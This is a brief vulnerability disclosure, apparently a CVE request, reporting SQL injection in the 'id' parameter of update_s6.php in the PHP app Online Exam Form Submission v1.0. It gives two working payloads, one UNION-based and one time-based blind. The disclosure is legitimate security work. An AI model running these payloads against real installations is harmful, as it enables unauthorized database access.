# Online Exam Form Submission v1.0 has SQL injection

BUG_Author：HaoL

Website source address: https://www.sourcecodester.com/php/14485/online-exam-form-submission-phpmysql-full-source-code-2020.html

Vulnerability File: /examformsubmission/admin/update_s6.php

GET parameter 'id' exists SQL injection vulnerability

Payload1: id=1' union all select null,concat(0x717273,0x66676869),null,null-- -

UNION query.

![image](https://github.com/Aiiimer/requestCVE/blob/main/1.png)

Payload2: id=1' and (select 1 from (select(sleep(10)))z) and 'k'='k

time-based blind

![image](https://github.com/Aiiimer/requestCVE/blob/main/2.png)
